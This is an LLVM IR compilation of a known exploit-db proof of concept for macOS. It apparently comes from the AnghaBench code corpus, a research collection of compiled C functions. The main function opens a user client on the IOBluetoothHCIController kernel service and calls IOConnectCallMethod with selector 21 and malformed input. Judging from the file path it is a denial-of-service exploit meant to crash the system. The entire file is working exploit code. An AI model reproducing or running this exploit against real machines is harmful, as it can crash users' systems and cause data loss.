; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39372.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39372.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"IOBluetoothHCIController\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca [16 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca [4096 x i8], align 16
  %12 = alloca i64, align 8
  %13 = alloca [16 x i32], align 16
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* @kIOMasterPortDefault, align 4
  %18 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %19 = call i64 @IOServiceGetMatchingService(i32 %17, i32 %18)
  store i64 %19, i64* %7, align 8
  %20 = load i64, i64* %7, align 8
  %21 = load i64, i64* @IO_OBJECT_NULL, align 8
  %22 = icmp eq i64 %20, %21
  br i1 %22, label %23, label %25

23:                                               ; preds = %2
  %24 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %47

25:                                               ; preds = %2
  %26 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %26, i32* %8, align 4
  %27 = load i64, i64* %7, align 8
  %28 = call i32 (...) @mach_task_self()
  %29 = call i64 @IOServiceOpen(i64 %27, i32 %28, i32 0, i32* %8)
  store i64 %29, i64* %6, align 8
  %30 = load i64, i64* %6, align 8
  %31 = load i64, i64* @KERN_SUCCESS, align 8
  %32 = icmp ne i64 %30, %31
  br i1 %32, label %33, label %35

33:                                               ; preds = %25
  %34 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %47

35:                                               ; preds = %25
  store i32 0, i32* %10, align 4
  store i64 1, i64* %12, align 8
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %37 = load i64, i64* %12, align 8
  %38 = call i32 @memset(i8* %36, i8 signext 65, i64 %37)
  store i32 0, i32* %14, align 4
  store i64 0, i64* %16, align 8
  %39 = load i32, i32* %8, align 4
  %40 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  %41 = load i32, i32* %10, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %43 = load i64, i64* %12, align 8
  %44 = getelementptr inbounds [16 x i32], [16 x i32]* %13, i64 0, i64 0
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %46 = call i64 @IOConnectCallMethod(i32 %39, i32 21, i32* %40, i32 %41, i8* %42, i64 %43, i32* %44, i32* %14, i8* %45, i64* %16)
  store i64 %46, i64* %6, align 8
  store i32 0, i32* %3, align 4
  br label %47

47:                                               ; preds = %35, %33, %23
  %48 = load i32, i32* %3, align 4
  ret i32 %48
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @memset(i8*, i8 signext, i64) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i64, i32*, i32*, i8*, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
